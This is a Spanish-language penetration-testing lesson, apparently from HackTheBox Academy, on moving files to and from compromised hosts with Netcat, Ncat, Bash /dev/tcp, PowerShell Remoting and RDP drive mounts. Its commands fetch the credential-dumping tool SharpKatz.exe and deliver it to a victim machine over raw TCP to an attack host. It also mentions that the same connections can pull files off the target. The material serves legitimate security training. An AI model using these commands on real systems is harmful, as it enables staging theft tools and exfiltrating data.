Hemos cubierto varios métodos para transferir archivos en Windows y Linux. También cubrimos formas de lograr el mismo objetivo utilizando diferentes lenguajes de programación, pero aún hay muchos más métodos y aplicaciones que podemos usar.

Esta sección cubrirá métodos alternativos como la transferencia de archivos usando [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) y utilizando sesiones de RDP y PowerShell.

---

## Netcat

[Netcat](https://sectools.org/tool/netcat/) (a menudo abreviado como `nc`) es una utilidad de redes informáticas para leer y escribir en conexiones de red usando TCP o UDP, lo que significa que podemos usarlo para operaciones de transferencia de archivos.

El Netcat original fue [lanzado](http://seclists.org/bugtraq/1995/Oct/0028.html) por Hobbit en 1995, pero no se ha mantenido a pesar de su popularidad. La flexibilidad y utilidad de esta herramienta llevó al Proyecto Nmap a producir [Ncat](https://nmap.org/ncat/), una reimplementación moderna que soporta SSL, IPv6, proxies SOCKS y HTTP, intermediación de conexiones y más.

En esta sección, usaremos tanto el Netcat original como Ncat.

**Nota:** **Ncat** se usa en el PwnBox de HackTheBox como nc, ncat y netcat.

## File Transfer con Netcat y Ncat

La máquina objetivo o atacante puede iniciar la conexión, lo cual es útil si un firewall impide el acceso al objetivo. Vamos a crear un ejemplo y transferir una herramienta a nuestro objetivo.

En este ejemplo, transferiremos [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) desde nuestro Pwnbox a la máquina comprometida. Lo haremos utilizando dos métodos. Empecemos con el primero.

Primero iniciaremos Netcat (`nc`) en la máquina comprometida, escuchando con la opción `-l`, seleccionando el puerto para escuchar con la opción `-p 8000`, y redirigiendo el [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)) usando un solo mayor que `>` seguido del nombre del archivo, `SharpKatz.exe`.

### NetCat - Máquina Comprometida - Escuchando en el Puerto 8000

```r
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

Si la máquina comprometida está usando Ncat, necesitaremos especificar `--recv-only` para cerrar la conexión una vez que la transferencia de archivos haya terminado.

### Ncat - Máquina Comprometida - Escuchando en el Puerto 8000

```r
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Desde nuestra máquina de ataque, nos conectaremos a la máquina comprometida en el puerto 8000 usando Netcat y enviaremos el archivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como input a Netcat. La opción `-q 0` le indicará a Netcat que cierre la conexión una vez que termine. De esa manera, sabremos cuándo se completó la transferencia de archivos.

### Netcat - Attack Host - Enviando Archivo a la Máquina Comprometida

```r
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
# Example using Original Netcat
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Utilizando Ncat en nuestra máquina de ataque, podemos optar por `--send-only` en lugar de `-q`. La flag `--send-only`, cuando se usa tanto en modos de conexión como de escucha, indica a Ncat que termine una vez que se agote su input. Normalmente, Ncat seguiría funcionando hasta que se cierre la conexión de red, ya que el lado remoto podría transmitir datos adicionales. Sin embargo, con `--send-only`, no hay necesidad de anticipar más información entrante.

### Ncat - Attack Host - Enviando Archivo a la Máquina Comprometida

```r
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
# Example using Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

En lugar de escuchar en nuestra máquina comprometida, podemos conectarnos a un puerto en nuestra máquina de ataque para realizar la operación de transferencia de archivos. Este método es útil en escenarios donde hay un firewall bloqueando conexiones entrantes. Escuchemos en el puerto 443 en nuestro Pwnbox y enviemos el archivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como input a Netcat.

### Attack Host - Enviando Archivo como Input a Netcat

```r
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### Máquina Comprometida Conectándose a Netcat para Recibir el Archivo

```r
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Hagamos lo mismo con Ncat:

### Attack Host - Enviando Archivo como Input a Ncat

```r
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

### Máquina Comprometida Conectándose a Ncat para Recibir el Archivo

```r
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

Si no tenemos Netcat o Ncat en nuestra máquina comprometida, Bash soporta operaciones de lectura/escritura en un pseudo-dispositivo archivo [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Escribir en este archivo en particular hace que Bash abra una conexión TCP a `host:port`, y esta característica puede ser utilizada para transferencias de archivos.

### NetCat - Enviando Archivo como Input a Netcat

```r
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### Ncat - Enviando Archivo como Input a Netcat

```r
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

### Máquina Comprometida Conectándose a Netcat Usando /dev/tcp para Recibir el Archivo

```r
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**Nota:** La misma operación puede ser utilizada para transferir archivos desde la máquina comprometida a nuestro Pwnbox.

---

## PowerShell Session File Transfer

Ya hemos hablado de hacer transferencias de archivos con PowerShell, pero puede haber escenarios en los que HTTP, HTTPS o SMB no estén disponibles. Si ese es el caso, podemos usar [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), también conocido como WinRM, para realizar operaciones de transferencia de archivos.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) nos permite ejecutar scripts o comandos en una computadora remota usando sesiones de PowerShell. Los administradores comúnmente usan PowerShell Remoting para gestionar computadoras remotas en una red, y nosotros también podemos usarlo para operaciones de transferencia de archivos. Por defecto, habilitar PowerShell remoting crea tanto un listener HTTP como HTTPS. Los listeners funcionan en los puertos por defecto TCP/5985 para HTTP y TCP/5986 para HTTPS.

Para crear una sesión de PowerShell Remoting en una computadora remota, necesitaremos acceso administrativo, ser miembro del grupo `Remote Management Users`, o tener permisos explícitos para PowerShell Remoting en la configuración de la sesión. Vamos a crear un ejemplo y transferir un archivo desde `DC01` a `DATABASE01` y viceversa.

Tenemos una sesión como `Administrator` en `DC01`, el usuario tiene derechos administrativos en `DATABASE01`, y PowerShell Remoting está habilitado. Usemos Test-NetConnection para confirmar que podemos conectarnos a WinRM.

### Desde DC01 - Confirmar que el puerto WinRM TCP 5985 está abierto en DATABASE01.

```r
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```r
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
Remote

Port       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Debido a que esta sesión ya tiene privilegios sobre `DATABASE01`, no necesitamos especificar credenciales. En el ejemplo a continuación, se crea una sesión en la computadora remota llamada `DATABASE01` y se almacenan los resultados en la variable llamada `$Session`.

### Crear una Sesión de PowerShell Remoting a DATABASE01

```r
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

Podemos usar el cmdlet `Copy-Item` para copiar un archivo desde nuestra máquina local `DC01` a la sesión `DATABASE01` que tenemos `$Session` o viceversa.

### Copiar samplefile.txt desde nuestro Localhost a la Sesión DATABASE01

```r
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

### Copiar DATABASE.txt desde la Sesión DATABASE01 a nuestro Localhost

```r
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## RDP

RDP (Remote Desktop Protocol) es comúnmente usado en redes Windows para acceso remoto. Podemos transferir archivos usando RDP copiando y pegando. Podemos hacer clic derecho y copiar un archivo desde la máquina Windows a la que nos conectamos y pegarlo en la sesión RDP.

Si nos conectamos desde Linux, podemos usar `xfreerdp` o `rdesktop`. Al momento de escribir esto, `xfreerdp` y `rdesktop` permiten copiar desde nuestra máquina objetivo a la sesión RDP, pero puede haber escenarios donde esto no funcione como se espera.

Como alternativa a copiar y pegar, podemos montar un recurso local en el servidor RDP objetivo. `rdesktop` o `xfreerdp` pueden ser usados para exponer una carpeta local en la sesión RDP remota.

### Montando una Carpeta de Linux Usando rdesktop

```r
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### Montando una Carpeta de Linux Usando xfreerdp

```r
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Para acceder al directorio, podemos conectarnos a `\\tsclient\`, lo que nos permite transferir archivos hacia y desde la sesión RDP.

![image](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)

Alternativamente, desde Windows, se puede usar el cliente de escritorio remoto nativo [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc).

![image](https://academy.hackthebox.com/storage/modules/24/rdp.png)

Después de seleccionar la unidad, podemos interactuar con ella en la sesión remota que sigue.

**Nota:** Esta unidad no es accesible para ningún otro usuario conectado a la computadora objetivo, incluso si logran secuestrar la sesión RDP.

---

## Practice Makes Perfect

Vale la pena referenciar esta sección o crear tus propias notas sobre estas técnicas y aplicarlas a laboratorios en otros módulos en el Penetration Tester Job Role Path y más allá. Algunos módulos/secciones donde estos podrían ser útiles incluyen:

- `Active Directory Enumeration and Attacks` - Skills Assessments 1 & 2
- A lo largo del módulo `Pivoting, Tunnelling & Port Forwarding`
- A lo largo del módulo `Attacking Enterprise Networks`
- A lo largo del módulo `Shells & Payloads`

Nunca sabes a qué te enfrentas hasta que empiezas un laboratorio (o evaluación en el mundo real). Una vez que domines una técnica en esta sección u otras secciones de este módulo, prueba otra. Para cuando termines el Penetration Tester Job Role Path, sería genial haber probado la mayoría, si no todas, estas técnicas. Esto ayudará con tu "memoria muscular" y te dará ideas de cómo cargar/descargar archivos cuando enfrentes un entorno diferente con ciertas restricciones que hagan que un método más fácil falle. En la siguiente sección, discutiremos cómo proteger nuestras transferencias de archivos cuando tratamos con datos sensibles.